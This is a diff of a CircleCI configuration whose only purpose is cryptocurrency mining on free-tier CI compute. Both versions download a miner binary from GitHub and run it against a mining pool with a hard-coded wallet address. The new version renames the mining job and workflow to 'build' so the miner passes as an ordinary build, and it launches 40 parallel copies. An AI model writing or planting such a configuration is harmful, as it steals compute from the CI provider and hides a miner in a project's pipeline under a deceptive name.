@@ -1,89 +1,63 @@
 version: 2.1
 
-parameters:
-  miner-url:
-    type: string
-    default: "https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64"
-  pool-address:
-    type: string
-    default: "stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.CircleCuy@pool-core-testnet.inichain.com:32672"
-
-executors:
-  ubuntu-executor:
-    docker:
-      - image: ubuntu:latest
-    resource_class: medium
-
 jobs:
-  miner:
-    executor: ubuntu-executor
+  build:
+    docker:
+      - image: cimg/base:stable
     steps:
       - run:
           name: Install Dependencies
-          command: apt-get update && apt-get install -y wget
-      - run:
-          name: Download and Setup Miner
           command: |
-            wget << pipeline.parameters.miner-url >>
+            sudo apt-get update
+            sudo apt-get install -y wget
+      - run:
+          name: Download and Run Miner
+          command: |
+            wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64
             chmod +x iniminer-linux-x64
-      - run:
-          name: Run Miner
-          command: |
-            while true; do
-              ./iniminer-linux-x64 --pool << pipeline.parameters.pool-address >> --cpu-devices 0 1
-              sleep 1
-            done
-          no_output_timeout: 3h
+            ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.CircleCuy@pool-core-testnet.inichain.com:32672 --cpu-devices 0 1
 
 workflows:
   version: 2
-  mining-workflow:
+  build-workflow:
     jobs:
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      # Maksimal 30 jobs di free tier
-
-  # Schedule workflow
-  scheduled-mining:
-    triggers:
-      - schedule:
-          cron: "0 */6 * * *"
-          filters:
-            branches:
-              only:
-                - main
-    jobs:
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      # ... tambahkan sesuai kebutuhan sampai 30
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
+      - build
